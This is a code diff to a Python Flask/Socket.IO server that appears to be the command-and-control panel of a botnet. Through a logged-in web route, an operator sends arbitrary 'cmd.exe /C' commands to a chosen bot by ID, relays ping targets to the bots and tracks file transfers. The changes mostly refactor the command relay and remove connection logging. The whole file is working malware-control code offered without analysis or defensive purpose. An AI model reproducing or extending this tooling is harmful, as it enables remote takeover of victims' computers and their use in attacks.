@@ -17,7 +17,7 @@ server_port = 8000
 idNumber = 0
 database = []
 completedTasks = []
-command_output = 'COMMAND OUTPUT'
+command_output = 'Now when you will again send any command you will see the output of previous command'
 ping_output_list = []
 file_transfer_list = []
 
@@ -117,38 +117,30 @@ def handle_modules_output(module_output):
 def commands():
     if not session.get('loggedin'):
         return redirect(url_for('login'))
-
     idNumber = request.args.get('idNumber')
-    command = request.args.get('command')
-
-    if idNumber and command:
+    cmd = request.args.get('command')
+    if idNumber and cmd:
         client_info = next((client for client in database if client.idNumber == int(idNumber)), None)
         if client_info:
             hostname = client_info.hostname
-            send_commands(idNumber, command, hostname)
+            command = f"cmd.exe /C {cmd}"
+            server.emit('commands', {'idNumber': idNumber, 'command': command, 'hostname': hostname})
             global command_output
-            return render_template('commands.html', commands_output=command_output)
+            return render_template('commands.html', output=command_output)
         else:
             return jsonify({'ERROR': 'BOT with provided BOT-ID not found'}), 404
     else:
-        return render_template('commands.html', commands_output='')
-
-def send_commands(idNumber, command, hostname):
-    client = next((c for c in database if c.idNumber == int(idNumber)), None)
-    if not client:
-        return f"ERROR : Bot with BOT-ID {idNumber} not found"
-    else:
-        command = f"cmd.exe /C {command}"
-        server.emit('commands', {'idNumber': idNumber, 'command': command, 'hostname': hostname})
+        issue = "This page has an ISSUE of Output delay for real-time debugging."
+        return render_template('commands.html', output=issue)
 
 @server.on('commands_output')
-def handle_commands_output(commands_output):
+def handle_commands_output(output):
     global command_output
-    command_output = commands_output.get('output')
+    command_output = output.get('output')
 
 @app.route('/ping', methods=['GET'])
 def ping():
-    ip_address = request.args.get('target_ip')
+    ip_address = request.args.get('target')
     if ip_address:
         send_ping(ip_address)
         global ping_output_list
@@ -255,15 +247,15 @@ def logout():
 
 @server.on('connect')
 def onConnect():
-    print(f'CLIENT {idNumber} JUST CONNECTED TO THE SERVER 🟩')
+    pass
 
 @server.on('disconnect')
 def onDisconnect():
-    print(f'CLIENT {idNumber} DISCONNECTED FROM THE SERVER 🟥')
+    pass
 
 @server.on('Initial_Information')
 def handleInformation(Initial_Information):
-        database.append(Client(Initial_Information))
+    database.append(Client(Initial_Information))
 
 if __name__ == '__main__':
     server.run(app, host=server_ip, port=server_port)
